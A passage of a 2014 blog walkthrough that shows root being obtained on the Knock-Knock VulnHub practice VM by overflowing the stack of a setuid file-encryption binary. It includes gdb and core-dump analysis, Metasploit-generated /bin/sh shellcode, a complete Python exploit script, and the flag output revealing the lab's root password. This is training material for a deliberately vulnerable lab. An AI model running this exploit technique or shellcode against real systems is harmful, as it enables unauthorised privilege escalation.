+</span><span class='line'>  |____|    \___  /    \______  /
+</span><span class='line'>                \/            \/ </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Looks like some type of file encrypter, let&rsquo;s test it out.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>jason@knockknock:~$ echo "test" &gt; in.tfc
+</span><span class='line'>jason@knockknock:~$ ./tfc in.tfc out.tfc
+</span><span class='line'>&gt;&gt; File crypted, goodbye!
+</span><span class='line'>jason@knockknock:~$ cat out.tfc 
+</span><span class='line'>��i�jason@knockknock:~$ </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Ok, so it does encrypt the input. Let&rsquo;s see what happens when we provide a huge input, maybe we&rsquo;ll be able to trigger buffer overflow condition.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>jason@knockknock:~$ python -c 'print "A" * 6000' &gt; in.tfc
+</span><span class='line'>jason@knockknock:~$ ./tfc in.tfc out.tfc
+</span><span class='line'>Segmentation fault</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Promising! Let&rsquo;s see what protections are enabled on it.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# scp checksec.sh jason@172.16.246.133:.
+</span><span class='line'>jason@172.16.246.133's password: 
+</span><span class='line'>checksec.sh                                   100%   26KB  26.5KB/s   00:00    </span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>jason@knockknock:~$ ./checksec.sh --file tfc
+</span><span class='line'>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+</span><span class='line'>No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   tfc</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Wow, everything disabled! That&rsquo;s gonna be one quick and easy exploit&hellip; well, at least that&rsquo;s what I thought!</p>
+
+<p>Let&rsquo;s get a copy of binary to our Kali (knock-knock doesn&rsquo;t have gdb on it) and debug it in gdb to see if we can overwrite return address.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# python -c 'print "A" * 6000' &gt; in.tfc
+</span><span class='line'>root@kali:~# gdb tfc 
+</span><span class='line'>GNU gdb (GDB) 7.4.1-debian
+</span><span class='line'>Copyright (C) 2012 Free Software Foundation, Inc.
+</span><span class='line'>License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
+</span><span class='line'>This is free software: you are free to change and redistribute it.
+</span><span class='line'>There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+</span><span class='line'>and "show warranty" for details.
+</span><span class='line'>This GDB was configured as "i486-linux-gnu".
+</span><span class='line'>For bug reporting instructions, please see:
+</span><span class='line'>&lt;http://www.gnu.org/software/gdb/bugs/&gt;...
+</span><span class='line'>Reading symbols from /root/tfc...(no debugging symbols found)...done.
+</span><span class='line'>(gdb) run in.tfc out.tfc
+</span><span class='line'>Starting program: /root/tfc in.tfc out.tfc
+</span><span class='line'>
+</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
+</span><span class='line'>0x0675c916 in ?? ()</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Huh? 0x0675c916? Where&rsquo;s my 0x41414141? I think the entire input (even out of bounds) is getting encrypted&hellip; oh boy, that&rsquo;s gonna be fun.</p>
+
+<p>I started playing around with inputs and analysing the behaviour of the encryption, when I suddenly came up with an idea to see what will happen if I will pass in encrypted output as an input:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# echo "hello" &gt; in.tfc
+</span><span class='line'>root@kali:~# ./tfc in.tfc out.tfc 
+</span><span class='line'>&gt;&gt; File crypted, goodbye!
+</span><span class='line'>root@kali:~# ./tfc out.tfc out2.tfc
+</span><span class='line'>&gt;&gt; File crypted, goodbye!
+</span><span class='line'>root@kali:~# cat out2.tfc 
+</span><span class='line'>hello</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Sweet, that could be potentially useful! It means that I should be able to encode my payload and then pass it in as an input and it should work! Yeah, not really&hellip; I actually won&rsquo;t be able to get my full payload (shellcode etc.) encrypted as I will need to write out of bounds, and the application will crash instead of giving me my output.</p>
+
+<p>From the analysis I did, it was also impossible to just encrypt shellcode and append it to the end of actual payload as the decryption would be different. Ahhh, seems like the only option is to reverse engineer the encryption mechanism and implement my own, with bigger buffer, pass my exploit payload through it, encrypt it, and then passed the encrypted one into the <code>tfc</code> to exploit it. Seems like a lot of work&hellip; and I&rsquo;m not that strong with super detailed analysis of assembly (at least not yet!). Hmmmmm&hellip; what else can I do!</p>
+
+<p>And then it hit me. A lot of useful, debugging information is in the dumped core files! How about if I&rsquo;ll just extract entire encoded input from dumped core, instead of reverse engineering the encryption? Sounds like a plan!</p>
+
+<p>To allow cores being dumped we can just increase maximum size of core files created by running:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# ulimit -c unlimited</span></code></pre></td></tr></table></div></figure>
+
+
+<p>But first, how do I know what exactly to extract? I will need to know offset of where to start and length of the input I need.</p>
+
+<p>With trial and error (basically passing in input of varying lengths and checking value of return address in gdb), I was able to figure out how many bytes to pass in to overwrite the return address (4124 bytes).</p>
+
+<p>Cool, now we need to know where to start.</p>
+
+<p>Analysing encrypted output, I realised that the input with &ldquo;A&#8221;s always starts with the same bytes (as long as there&rsquo;s more than 4 &#8220;A&#8221;s - but that&rsquo;s the way the encrypting algorithm works - I did a simple analysis of it in IDA).</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# python -c 'print "A" * 100' &gt; in.tfc
+</span><span class='line'>root@kali:~# ./tfc in.tfc out.tfc
+</span><span class='line'>&gt;&gt; File crypted, goodbye!
+</span><span class='line'>root@kali:~# xxd out.tfc | head
+</span><span class='line'>0000000: def0 5bab 5df7 ab43 0690 fe64 6cb0 0b48  ..[.]..C...dl..H</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So, as long as there&rsquo;s only one occurence of <code>def0 5bab</code> in the core, we have all information we need. Let&rsquo;s check the core.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# python -c 'print "A" * 6000' &gt; in.tfc
+</span><span class='line'>root@kali:~# ./tfc in.tfc out.tfc 
+</span><span class='line'>Segmentation fault (core dumped)
+</span><span class='line'>root@kali:~# xxd core | grep 'def0 5bab'
+</span><span class='line'>0030700: def0 5bab 5df7 ab43 0690 fe64 6cb0 0b48  ..[.]..C...dl..H</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Awesome! Now we can craft our exploit and extract its encrypted version from the core.</p>
+
+<p>But we need few more things for our exploit to make it work, address of a <code>jmp esp</code> instruction to overwrite return address with (to tell the program to jump to the top of the stack) and actual shellcode (we&rsquo;ll use metasploit payload generator).</p>
+
+<p>To get <code>jmp esp</code> address, we&rsquo;ll use <code>msfelfscan</code>.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# msfelfscan -j esp tfc 
+</span><span class='line'>[tfc]
+</span><span class='line'>0x08048e93 jmp esp
+</span><span class='line'>0x08048e93 jmp esp</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Sweet, the address doesn&rsquo;t have null bytes, so that makes it easier (otherwise it would probably messed up our exploit, as it would be treated as end of string).</p>
+
+<p>Now the shellcode. We&rsquo;ll use metasploit to generate something that would suit our needs.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/exploit# msfconsole
+</span><span class='line'>
+</span><span class='line'>IIIIII    dTb.dTb        _.---._
+</span><span class='line'>  II     4'  v  'B   .'"".'/|\`.""'.
+</span><span class='line'>  II     6.     .P  :  .' / | \ `.  :
+</span><span class='line'>  II     'T;. .;P'  '.'  /  |  \  `.'
+</span><span class='line'>  II      'T; ;P'    `. /   |   \ .'
+</span><span class='line'>IIIIII     'YvP'       `-.__|__.-'
+</span><span class='line'>
+</span><span class='line'>I love shells --egypt
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Love leveraging credentials? Check out bruteforcing
+</span><span class='line'>in Metasploit Pro -- learn more on http://rapid7.com/metasploit
+</span><span class='line'>
+</span><span class='line'>       =[ metasploit v4.10.0-2014100201 [core:4.10.0.pre.2014100201 api:1.0.0]]
+</span><span class='line'>+ -- --=[ 1349 exploits - 742 auxiliary - 217 post        ]
+</span><span class='line'>+ -- --=[ 340 payloads - 35 encoders - 8 nops             ]
+</span><span class='line'>+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+</span><span class='line'>
+</span><span class='line'>msf &gt; use payload/linux/x86/
+</span><span class='line'>use payload/linux/x86/adduser
+</span><span class='line'>use payload/linux/x86/chmod
+</span><span class='line'>use payload/linux/x86/exec
+</span><span class='line'>use payload/linux/x86/meterpreter/bind_ipv6_tcp
+</span><span class='line'>use payload/linux/x86/meterpreter/bind_nonx_tcp
+</span><span class='line'>use payload/linux/x86/meterpreter/bind_tcp
+</span><span class='line'>use payload/linux/x86/meterpreter/find_tag
+</span><span class='line'>use payload/linux/x86/meterpreter/reverse_ipv6_tcp
+</span><span class='line'>use payload/linux/x86/meterpreter/reverse_nonx_tcp
+</span><span class='line'>use payload/linux/x86/meterpreter/reverse_tcp
+</span><span class='line'>use payload/linux/x86/metsvc_bind_tcp
+</span><span class='line'>use payload/linux/x86/metsvc_reverse_tcp
+</span><span class='line'>use payload/linux/x86/read_file
+</span><span class='line'>use payload/linux/x86/shell/bind_ipv6_tcp
+</span><span class='line'>use payload/linux/x86/shell/bind_nonx_tcp
+</span><span class='line'>use payload/linux/x86/shell/bind_tcp
+</span><span class='line'>use payload/linux/x86/shell/find_tag
+</span><span class='line'>use payload/linux/x86/shell/reverse_ipv6_tcp
+</span><span class='line'>use payload/linux/x86/shell/reverse_nonx_tcp
+</span><span class='line'>use payload/linux/x86/shell/reverse_tcp
+</span><span class='line'>use payload/linux/x86/shell_bind_ipv6_tcp
+</span><span class='line'>use payload/linux/x86/shell_bind_tcp
+</span><span class='line'>use payload/linux/x86/shell_bind_tcp_random_port
+</span><span class='line'>use payload/linux/x86/shell_find_port
+</span><span class='line'>use payload/linux/x86/shell_find_tag
+</span><span class='line'>use payload/linux/x86/shell_reverse_tcp
+</span><span class='line'>use payload/linux/x86/shell_reverse_tcp2
+</span><span class='line'>msf &gt; use payload/linux/x86/exec 
+</span><span class='line'>msf payload(exec) &gt; show options
+</span><span class='line'>
+</span><span class='line'>Module options (payload/linux/x86/exec):
+</span><span class='line'>
+</span><span class='line'>   Name  Current Setting  Required  Description
+</span><span class='line'>   ----  ---------------  --------  -----------
+</span><span class='line'>   CMD                    yes       The command string to execute
+</span><span class='line'>
+</span><span class='line'>msf payload(exec) &gt; set CMD /bin/sh
+</span><span class='line'>CMD =&gt; /bin/sh
+</span><span class='line'>msf payload(exec) &gt; show options
+</span><span class='line'>
+</span><span class='line'>Module options (payload/linux/x86/exec):
+</span><span class='line'>
+</span><span class='line'>   Name  Current Setting  Required  Description
+</span><span class='line'>   ----  ---------------  --------  -----------
+</span><span class='line'>   CMD   /bin/sh          yes       The command string to execute
+</span><span class='line'>
+</span><span class='line'>msf payload(exec) &gt; generate -b '\x00'
+</span><span class='line'># linux/x86/exec - 70 bytes
+</span><span class='line'># http://www.metasploit.com
+</span><span class='line'># Encoder: x86/shikata_ga_nai
+</span><span class='line'># VERBOSE=false, PrependFork=false, PrependSetresuid=false, 
+</span><span class='line'># PrependSetreuid=false, PrependSetuid=false, 
+</span><span class='line'># PrependSetresgid=false, PrependSetregid=false, 
+</span><span class='line'># PrependSetgid=false, PrependChrootBreak=false, 
+</span><span class='line'># AppendExit=false, CMD=/bin/sh
+</span><span class='line'>buf = 
+</span><span class='line'>"\xdb\xd0\xbd\x79\xf6\x5f\x15\xd9\x74\x24\xf4\x58\x33\xc9" +
+</span><span class='line'>"\xb1\x0b\x31\x68\x1a\x03\x68\x1a\x83\xc0\x04\xe2\x8c\x9c" +
+</span><span class='line'>"\x54\x4d\xf7\x33\x0d\x05\x2a\xd7\x58\x32\x5c\x38\x28\xd5" +
+</span><span class='line'>"\x9c\x2e\xe1\x47\xf5\xc0\x74\x64\x57\xf5\x8f\x6b\x57\x05" +
+</span><span class='line'>"\xbf\x09\x3e\x6b\x90\xbe\xa8\x73\xb9\x13\xa1\x95\x88\x14"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Bunch of shellcodes available for our target system, we&rsquo;ll use one that executes command, and the command will of course be <code>/bin/sh</code> :)</p>
+
+<p>Also, generating payload with <code>-b</code> switch allows us to specify characters to blacklist. We don&rsquo;t want any null bytes in our shellcode, so we&rsquo;ll blacklist that.</p>
+
+<p><em>EDIT: Thanks to <a href="https://twitter.com/TheColonial">TheColonial</a> for pointing this out - getting rid of NULL bytes is actually not required. NULL bytes are fine as we&rsquo;re reading from file and an entire file is read into memory!</em></p>
+
+<p>Ok, now we have all we need. Let&rsquo;s have a look how our final exploit will look like.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#/usr/bin/python</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># Metasploit generated shellcode - 70 bytes</span>
+</span><span class='line'><span class="n">shellcode</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\xdb\xd0\xbd\x79\xf6\x5f\x15\xd9\x74\x24\xf4\x58\x33\xc9\xb1\x0b\x31\x68\x1a\x03\x68\x1a\x83\xc0\x04\xe2\x8c\x9c\x54\x4d\xf7\x33\x0d\x05\x2a\xd7\x58\x32\x5c\x38\x28\xd5\x9c\x2e\xe1\x47\xf5\xc0\x74\x64\x57\xf5\x8f\x6b\x57\x05\xbf\x09\x3e\x6b\x90\xbe\xa8\x73\xb9\x13\xa1\x95\x88\x14</span><span class="s">&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">content</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">4124</span>             <span class="c"># fill up the buffer</span>
+</span><span class='line'><span class="n">content</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x93\x8e\x04\x08</span><span class="s">&quot;</span>    <span class="c"># overwrite return address with address of &#39;jmp esp&#39; instruction</span>
+</span><span class='line'><span class="n">content</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x83\xec\x7f</span><span class="s">&quot;</span>        <span class="c"># instruction code for &#39;sub $esp, 175&#39; to make space on the stack for the shellcode (basically rewinding stack)</span>
+</span><span class='line'><span class="n">content</span> <span class="o">+=</span> <span class="n">shellcode</span>             <span class="c"># our shellcode (70 bytes)</span>
+</span><span class='line'><span class="n">content</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span> <span class="o">*</span> <span class="mi">105</span>          <span class="c"># padding after the shellcode to ensure nothing immediatelly after the shellcode is executed as well and therefore corrupting our shellcode</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># Print the exploit (we&#39;ll redirect output to file)</span>
+</span><span class='line'><span class="k">print</span> <span class="n">content</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Alright, let&rsquo;s rock&#8217;n&#8217;roll, print exploit to file, run it through <code>tfc</code>, extract encrypted exploit from core, pass it in again and it should work!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# python exploit.py &gt; exploit.in.tfc
+</span><span class='line'>root@kali:~# ./tfc exploit.in.tfc exploit.out.tfc
+</span><span class='line'>Segmentation fault (core dumped)
+</span><span class='line'>root@kali:~# xxd core | grep 'def0 5bab'
+</span><span class='line'>002fe00: def0 5bab 5df7 ab43 0690 fe64 6cb0 0b48  ..[.]..C...dl..H</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Use <code>dd</code> to carve out what we need, byte by byte, skipping first 196096 bytes (002fe00 in hex - as above) and grabbing all 4306 bytes (total length of our exploit):</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# dd if=core of=exploit.out.tfc skip=196096 count=4306 bs=1
+</span><span class='line'>4306+0 records in
+</span><span class='line'>4306+0 records out
+</span><span class='line'>4306 bytes (4.3 kB) copied, 0.017911 s, 240 kB/s
+</span><span class='line'>root@kali:~# ./tfc exploit.out.tfc pwnd.tfc
+</span><span class='line'># id
+</span><span class='line'>uid=0(root) gid=0(root) groups=0(root)
+</span><span class='line'># </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Woohooooo, so it works locally on our Kali! All we have left to do is copy our encrypted payload onto knock-knock and run it there.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# scp exploit.out.tfc jason@172.16.246.133:.
+</span><span class='line'>jason@172.16.246.133's password: 
+</span><span class='line'>exploit.out.tfc                               100% 4306     4.2KB/s   00:00    </span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>jason@knockknock:~$ ./tfc exploit.out.tfc pwned.tfc
+</span><span class='line'># whoami
+</span><span class='line'>root
+</span><span class='line'># cd /root
+</span><span class='line'># ls
+</span><span class='line'>crpt.py  server.py  start.sh  the_flag_is_in_here
+</span><span class='line'># cd the_flag_is_in_here
+</span><span class='line'># ls
+</span><span class='line'>qQcmDWKM5a6a3wyT.txt
+</span><span class='line'># cat *    
+</span><span class='line'> __                         __              __                         __      ____ 
+</span><span class='line'>|  | __ ____   ____   ____ |  | __         |  | __ ____   ____   ____ |  | __ /_   |
+</span><span class='line'>|  |/ //    \ /  _ \_/ ___\|  |/ /  ______ |  |/ //    \ /  _ \_/ ___\|  |/ /  |   |
+</span><span class='line'>|    &lt;|   |  (  &lt;_&gt; )  \___|    &lt;  /_____/ |    &lt;|   |  (  &lt;_&gt; )  \___|    &lt;   |   |
+</span><span class='line'>|__|_ \___|  /\____/ \___  &gt;__|_ \         |__|_ \___|  /\____/ \___  &gt;__|_ \  |___|
+</span><span class='line'>     \/    \/            \/     \/              \/    \/            \/     \/       
+</span><span class='line'>
+</span><span class='line'>Hooray you got the flag!
+</span><span class='line'>
+</span><span class='line'>Hope you had as much fun r00ting this as I did making it!
+</span><span class='line'>
+</span><span class='line'>Feel free to hit me up in #vulnhub @ zer0w1re
+</span><span class='line'>
+</span><span class='line'>Gotta give a big shout out to c0ne, who helpped to make the tfc binary challenge,
+</span><span class='line'>as well as rasta_mouse, and recrudesce for helping to find bugs and test the VM :)
+</span><span class='line'>
+</span><span class='line'>root password is "qVx4UJ*zcUdc9#3C$Q", but you should already have a shell, right? ;)
+</span><span class='line'># </span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Summary</h2>
+
+<p>Pretty awesome challenge! Really exercised my brain cells and I&rsquo;m glad I came up with a simple method of exploiting it without going into reverse engineering of the encryption mechanism.</p>
+
+<p>I have actually started reversing it and got a fair bit into it, but then got this core dump idea and decided to write it up this way.</p>
+
+<p>I saw other guys reverse engineered the encryption mechanism and got it working as well, I&rsquo;d recommend for you to go and check out what <a href="https://leonjza.github.io/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock/">leonjza</a> and <a href="http://barrebas.github.io/blog/2014/10/14/knock-knock-knocking-on-roots-door/">barrebas</a> did!</p>
+
+<p>Again, awesome challenge - big thanks to <a href="http://vulnhub.com">VulnHub</a> and <a href="https://twitter.com/zer0w1re">zer0w1re</a>!</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Knapsy</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2014-10-16T15:29:15+11:00'><span class='date'><span class='date-month'>Oct</span> <span class='date-day'>16</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>3:29 pm</span></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/boot2root/'>boot2root</a>, <a class='category' href='/blog/categories/buffer-overflow/'>buffer overflow</a>, <a class='category' href='/blog/categories/pentesting/'>pentesting</a>, <a class='category' href='/blog/categories/port-knocking/'>port knocking</a>, <a class='category' href='/blog/categories/vulnhub/'>vulnhub</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://blog.knapsy.com/blog/2014/10/16/knock-knock-vm-walkthrough/" data-via="TheKnapsy" data-counturl="http://blog.knapsy.com/blog/2014/10/16/knock-knock-vm-walkthrough/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2014/10/07/basic-shellshock-exploitation/" title="Previous Post: Basic Shellshock exploitation">&laquo; Basic Shellshock exploitation</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2014/10/28/beating-the-troll-tr0ll2-writeup/" title="Next Post: Beating the Troll - Tr0ll2 writeup">Beating the Troll - Tr0ll2 writeup &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>About Me</h1>
+  <p><img src="https://pbs.twimg.com/profile_images/1023056649072730112/mzJOzYd0_bigger.jpg" align="right"/><strong>Knapsy</strong> (<u><a href="http://twitter.com/TheKnapsy">@TheKnapsy</a></u>)<br/>
+  IT security guy, pentester, coder, basketballer, coffee enthusiast. Creative, bit nuts, sleep deprived.</p>
+</section>
+<section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2018/08/05/filevault-ctf-challenge-elf-x64-buffer-overflow/">FileVault CTF Challenge - ELF X64 Buffer Overflow</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2017/05/01/quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/">QuickZip 4.60 - Win7 X64 SEH Overflow (Egghunter) With Custom Encoder</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/02/24/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells-sectalks-melbourne-0x01-2016/">Escape From SHELLcatraz - Breaking Out of Restricted Unix Shells (SecTalks Melbourne 0x01 2016)</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/11/25/easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/">Easy File Sharing Web Server v7.2 - Remote SEH Buffer Overflow (DEP Bypass With ROP)</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/03/29/oscp-thoughts-and-tips/">OSCP - Thoughts and Tips</a>
+      </li>
+    
+  </ul>
+</section>
+
+<section>
+  <h1>Latest Tweets</h1>
+  <p><a class="twitter-timeline" href="https://twitter.com/TheKnapsy" data-widget-id="517677537711767552">Tweets by @TheKnapsy</a></p>
